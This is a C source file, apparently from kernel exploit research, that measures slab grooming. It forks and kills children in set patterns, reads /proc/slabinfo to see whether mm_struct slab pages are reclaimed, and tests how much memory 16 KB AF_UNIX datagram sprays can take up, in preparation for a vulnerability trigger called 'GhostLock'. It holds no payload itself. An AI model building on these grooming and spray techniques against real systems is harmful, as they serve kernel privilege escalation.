/* reclaim_probe.c — G5 T1 只读判定：mm_struct slab 页在 groom 后是否真的回到 buddy。
 *
 * 安全边界：仅 fork/kill/pause + 读 /proc/slabinfo、/proc/meminfo、/proc/self/status；
 * 不写内核、不触发 GhostLock、不提交任何内核命令。进程全部在本进程内创建/回收。
 *
 * 判定：
 *  E1（mass-free）：fork N 子进程（各自分配 mm_struct）→ 全部 kill → 看 mm_struct
 *      slabdata 是否回落。回落 ⇒ 空 slab 被 discard_slab 回 buddy。
 *  E2（seed + mass-free）：fork N → 每 18 个杀 1 个（seed，满足 node partial ≥ min_partial=5）
 *      → 杀其余 → 看 slabdata 回落幅度是否优于 E1。
 *
 * 用法: reclaim_probe slab [N]      # 默认 N=576（32 slab × 18）
 *       reclaim_probe spray [pages]  # 仅测 dgram 16064 喷射容量（无 buddyinfo 权限）
 */
#define _GNU_SOURCE
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define MM_OBJS_PER_SLAB 18
#define MAX_CHILDREN 2048

static pid_t kids[MAX_CHILDREN];
static int nkids;

static double now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0)
        printf("WARN sched_setaffinity cpu%d: %s\n", cpu, strerror(errno));
}

/* 读 /proc/slabinfo 的 mm_struct 行：打印 6 个主字段 + slabdata 两个 */
static int read_mm_slab(long *active_objs, long *num_objs, long *obj_per_slab,
                        long *pages_per_slab, long *active_slabs, long *num_slabs) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    int ok = -1;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "mm_struct ", 10) == 0) {
            long a, n, osz, ops, pps, as, ns, sh;
            /* mm_struct active num objsize objperslab pagesperslab :
             *   tunables x y z : slabdata active_slabs num_slabs sharedavail */
            if (sscanf(line, "mm_struct %ld %ld %ld %ld %ld : tunables %*d %*d %*d "
                             ": slabdata %ld %ld %ld",
                       &a, &n, &osz, &ops, &pps, &as, &ns, &sh) >= 7) {
                *active_objs = a; *num_objs = n; *obj_per_slab = ops;
                *pages_per_slab = pps; *active_slabs = as; *num_slabs = ns;
                ok = 0;
            }
            break;
        }
    }
    fclose(f);
    return ok;
}

static void print_slab(const char *tag) {
    long a, n, ops, pps, as, ns;
    if (read_mm_slab(&a, &n, &ops, &pps, &as, &ns) != 0) {
        printf("%s slab=NA\n", tag);
        return;
    }
    printf("%s slab: active_objs=%ld num_objs=%ld ops=%ld pps=%ld active_slabs=%ld num_slabs=%ld\n",
           tag, a, n, ops, pps, as, ns);
}

static void print_mem(const char *tag) {
    FILE *f = fopen("/proc/meminfo", "r");
    long free_kb = -1, avail_kb = -1;
    char k[64];
    long v;
    char unit[16];
    if (!f) { printf("%s mem=NA\n", tag); return; }
    while (fscanf(f, "%63s %ld %15s", k, &v, unit) == 3) {
        if (strcmp(k, "MemFree:") == 0) free_kb = v;
        if (strcmp(k, "MemAvailable:") == 0) avail_kb = v;
        if (free_kb >= 0 && avail_kb >= 0) break;
    }
    fclose(f);
    printf("%s mem: MemFree=%ldkB MemAvailable=%ldkB\n", tag, free_kb, avail_kb);
}

static void boot_state(const char *tag) {
    char id[128] = "?", up[64] = "?";
    FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
    if (f) { if (fgets(id, sizeof(id), f)) id[strcspn(id, "\r\n")] = 0; fclose(f); }
    f = fopen("/proc/uptime", "r");
    if (f) { if (fgets(up, sizeof(up), f)) up[strcspn(up, "\r\n")] = 0; fclose(f); }
    printf("%s boot_id=%s uptime=%s\n", tag, id, up);
}

static int fork_kids(int n) {
    int i;
    nkids = 0;
    for (i = 0; i < n && i < MAX_CHILDREN; i++) {
        pid_t p = fork();
        if (p < 0) {
            printf("fork failed at %d/%d: %s\n", i, n, strerror(errno));
            break;
        }
        if (p == 0) {
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            if (getppid() == 1) _exit(0);
            for (;;) pause();
        }
        kids[nkids++] = p;
    }
    return nkids;
}

static void kill_kid(pid_t p) {
    kill(p, SIGKILL);
    waitpid(p, NULL, 0);
}

static void kill_all(void) {
    int i;
    for (i = 0; i < nkids; i++) kill_kid(kids[i]);
    nkids = 0;
}

/* E2：每 18 个杀第 0 个作为 seed，然后杀其余 */
static void kill_seed_then_rest(void) {
    int i;
    for (i = 0; i < nkids; i += MM_OBJS_PER_SLAB) {
        if (i < nkids) kill_kid(kids[i]);
        kids[i] = -1;
    }
    for (i = 0; i < nkids; i++)
        if (kids[i] > 0) kill_kid(kids[i]);
    nkids = 0;
}

static long spray_pages(int want) {
    int nsock = 256, maxpkt = (want + nsock - 1) / nsock;
    int (*fds)[2] = calloc(nsock, sizeof(int[2]));
    char *payload = malloc(16064);
    long ok = 0, fail = 0;
    int i, j;
    memset(payload, 0x41, 16064);
    for (i = 0; i < nsock; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, fds[i]) < 0) { nsock = i; break; }
        int rcv = 2 * 1024 * 1024;
        setsockopt(fds[i][0], SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
    }
    for (i = 0; i < nsock; i++)
        for (j = 0; j < maxpkt; j++) {
            ssize_t r = send(fds[i][0], payload, 16064, MSG_DONTWAIT);
            if (r == 16064) ok++; else { fail++; break; }
        }
    printf("spray: sockets=%d ok=%ld fail=%ld want=%d\n", nsock, ok, fail, want);
    for (i = 0; i < nsock; i++) { close(fds[i][0]); close(fds[i][1]); }
    free(fds); free(payload);
    return ok;
}

/* 持有喷射结果并测 MemFree 变化（不在返回前关闭 socket） */
static long spray_hold(int want, int hold_ms) {
    int nsock = 256, maxpkt = (want + nsock - 1) / nsock;
    int (*fds)[2] = calloc(nsock, sizeof(int[2]));
    char *payload = malloc(16064);
    long ok = 0, fail = 0;
    int i, j;
    memset(payload, 0x41, 16064);
    for (i = 0; i < nsock; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, fds[i]) < 0) { nsock = i; break; }
        int rcv = 2 * 1024 * 1024;
        setsockopt(fds[i][0], SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
    }
    for (i = 0; i < nsock; i++)
        for (j = 0; j < maxpkt; j++) {
            ssize_t r = send(fds[i][0], payload, 16064, MSG_DONTWAIT);
            if (r == 16064) ok++; else { fail++; break; }
        }
    printf("sprayhold: sockets=%d ok=%ld fail=%ld want=%d\n", nsock, ok, fail, want);
    print_mem("sprayhold-alloc");
    usleep(hold_ms * 1000);
    print_mem("sprayhold-held");
    for (i = 0; i < nsock; i++) { close(fds[i][0]); close(fds[i][1]); }
    free(fds); free(payload);
    usleep(200 * 1000);
    print_mem("sprayhold-released");
    return ok;
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "slab";
    int n = argc > 2 ? atoi(argv[2]) : 576;
    char allowed[128] = "?";
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f))
            if (strncmp(line, "Cpus_allowed_list:", 18) == 0) {
                sscanf(line + 18, "%127s", allowed); break;
            }
        fclose(f);
    }
    printf("== reclaim_probe mode=%s n=%d uid=%d cpus_allowed=%s ==\n",
           mode, n, getuid(), allowed);
    boot_state("start");
    pin_cpu(0);
    print_slab("base");
    print_mem("base");

    if (strcmp(mode, "spray") == 0) {
        double t0 = now_ms();
        long ok = spray_pages(n);
        printf("spray done ok=%ld dt=%.0fms\n", ok, now_ms() - t0);
        print_mem("post");
        boot_state("end");
        return 0;
    }
    if (strcmp(mode, "sprayhold") == 0) {
        long ok = spray_hold(n, 1000);
        printf("sprayhold done ok=%ld\n", ok);
        boot_state("end");
        return 0;
    }

    /* E3: A17 式 pre/leak/post —— 保留 1 个 leak 代理，先杀 pre 与其余，最后杀 leak */
    if (strcmp(mode, "prepost") == 0) {
        int leak = 17; /* 0-based：前 17 个填满一个 slab，第 18 个是 leak 代理 */
        double t0 = now_ms();
        int got = fork_kids(n);
        printf("E3 forked=%d dt=%.0fms leak_idx=%d\n", got, now_ms() - t0, leak);
        print_slab("E3 post-fork");
        t0 = now_ms();
        for (int i = 0; i < nkids; i++)
            if (i != leak) kill_kid(kids[i]);
        printf("E3 killed pre+rest dt=%.0fms\n", now_ms() - t0);
        usleep(200 * 1000);
        print_slab("E3 post-pre-kill");
        t0 = now_ms();
        if (leak < nkids) kill_kid(kids[leak]);
        printf("E3 killed leak dt=%.0fms\n", now_ms() - t0);
        usleep(400 * 1000);
        print_slab("E3 post-leak-kill");
        print_mem("E3 post");
        nkids = 0;
        boot_state("end");
        printf("done\n");
        return 0;
    }

    /* E1: mass free */
    printf("-- E1 mass-free N=%d --\n", n);
    {
        double t0 = now_ms();
        int got = fork_kids(n);
        printf("E1 forked=%d dt=%.0fms\n", got, now_ms() - t0);
        print_slab("E1 post-fork");
        print_mem("E1 post-fork");
        t0 = now_ms();
        kill_all();
        printf("E1 killed dt=%.0fms\n", now_ms() - t0);
        usleep(400 * 1000);
        print_slab("E1 post-kill");
        print_mem("E1 post-kill");
    }

    /* E2: seed + mass free */
    printf("-- E2 seed+mass-free N=%d --\n", n);
    {
        double t0 = now_ms();
        int got = fork_kids(n);
        printf("E2 forked=%d dt=%.0fms\n", got, now_ms() - t0);
        print_slab("E2 post-fork");
        t0 = now_ms();
        kill_seed_then_rest();
        printf("E2 killed dt=%.0fms\n", now_ms() - t0);
        usleep(400 * 1000);
        print_slab("E2 post-kill");
        print_mem("E2 post-kill");
    }

    boot_state("end");
    printf("done\n");
    return 0;
}
